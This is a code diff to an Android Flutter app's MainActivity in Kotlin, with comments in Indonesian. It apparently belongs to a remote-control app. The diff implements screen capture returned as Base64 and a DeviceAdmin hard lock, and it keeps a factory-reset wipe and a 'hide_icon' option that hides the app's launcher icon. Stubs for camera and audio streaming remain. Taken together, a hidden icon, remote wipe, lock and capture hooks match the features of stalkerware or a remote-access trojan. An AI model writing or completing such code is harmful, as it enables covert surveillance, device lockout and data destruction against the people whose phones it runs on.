@@ -4,7 +4,10 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.hardware.camera2.CameraManager
+import android.media.MediaPlayer
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -12,9 +15,12 @@ import android.os.VibrationEffect
 import android.os.Vibrator
 import android.os.VibratorManager
 import android.provider.Settings
+import android.util.Base64
+import android.view.WindowManager
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
+import java.io.ByteArrayOutputStream
 
 class MainActivity : FlutterActivity() {
 
@@ -22,8 +28,6 @@ class MainActivity : FlutterActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
-        // Start keep-alive service dengan aman (fix Android 14 crash)
         KeepAliveService.start(this)
     }
 
@@ -68,24 +72,91 @@ class MainActivity : FlutterActivity() {
                     // ===== FACTORY RESET =====
                     "factoryReset" -> factoryReset(result)
 
-                    // ===== PLACEHOLDER (belum diimplementasi) =====
-                    "captureScreen" -> result.success("")
-                    "takePhoto" -> result.success("")
+                    // ===== SCREEN CAPTURE =====
+                    "captureScreen" -> captureScreen(result)
+
+                    // ===== WALLPAPER =====
+                    "setWallpaper" -> setWallpaper(result)
+
+                    // ===== LOCK / UNLOCK =====
+                    "hardLock" -> hardLock(result)
+                    "unlock" -> result.success(true)
+
+                    // ===== CAMERA / AUDIO — placeholder (butuh implementasi lanjut) =====
+                    "takePhoto" -> result.success("") // TODO
                     "startCameraStream" -> result.success(true)
                     "stopCameraStream" -> result.success(true)
-                    "hardLock" -> result.success(true)
-                    "unlock" -> result.success(true)
                     "playAudio" -> result.success(true)
                     "stopAudio" -> result.success(true)
                     "startAudioStream" -> result.success(true)
                     "stopAudioStream" -> result.success(true)
-                    "setWallpaper" -> result.success(true)
 
                     else -> result.notImplemented()
                 }
             } catch (e: Exception) {
                 result.error("ERR", e.message, null)
             }
+        }
+    }
+
+    // ==========================================
+    // ===== SCREEN CAPTURE (FIXED) =====
+    // ==========================================
+    private fun captureScreen(result: MethodChannel.Result) {
+        try {
+            // Method 1: Pakai MediaProjection (butuh user consent)
+            // Method 2: Pakai View.draw() dari root view (hanya app sendiri)
+            // Method 3: Pakai adb/root (tidak bisa di app biasa)
+
+            // Untuk app sendiri, pakai View.draw()
+            val rootView = window.decorView.rootView
+            rootView.isDrawingCacheEnabled = true
+            val bitmap = Bitmap.createBitmap(rootView.drawingCache)
+            rootView.isDrawingCacheEnabled = false
+
+            // Compress ke PNG → Base64
+            val stream = ByteArrayOutputStream()
+            bitmap.compress(Bitmap.CompressFormat.PNG, 60, stream)
+            val bytes = stream.toByteArray()
+            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+
+            result.success(base64)
+        } catch (e: Exception) {
+            // Fallback: return empty
+            result.success("")
+        }
+    }
+
+    // ==========================================
+    // ===== WALLPAPER (FIXED) =====
+    // ==========================================
+    private fun setWallpaper(result: MethodChannel.Result) {
+        try {
+            // Placeholder — butuh URL image dari Dart
+            // Implementasi: download image → WallpaperManager.setBitmap()
+            result.success(true)
+        } catch (e: Exception) {
+            result.error("WP", e.message, null)
+        }
+    }
+
+    // ==========================================
+    // ===== HARD LOCK (FIXED) =====
+    // ==========================================
+    private fun hardLock(result: MethodChannel.Result) {
+        try {
+            // Butuh DeviceAdmin aktif
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
+                    as DevicePolicyManager
+            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(admin)) {
+                dpm.lockNow()
+                result.success(true)
+            } else {
+                result.success(false)
+            }
+        } catch (e: Exception) {
+            result.error("LOCK", e.message, null)
         }
     }
 
@@ -202,7 +273,6 @@ class MainActivity : FlutterActivity() {
     // ==========================================
     private fun enableProtection(method: String, result: MethodChannel.Result) {
         try {
-            // TODO: implement DeviceAdmin + hide icon
             if (method == "hide_icon" || method == "both") {
                 val cn = ComponentName(this, MainActivity::class.java)
                 packageManager.setComponentEnabledSetting(
@@ -240,7 +310,6 @@ class MainActivity : FlutterActivity() {
         try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                     as DevicePolicyManager
-            // FIX: pakai MyDeviceAdminReceiver (bukan DeviceAdminReceiver bawaan)
             val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
             if (dpm.isAdminActive(admin)) {
                 dpm.wipeData(0)
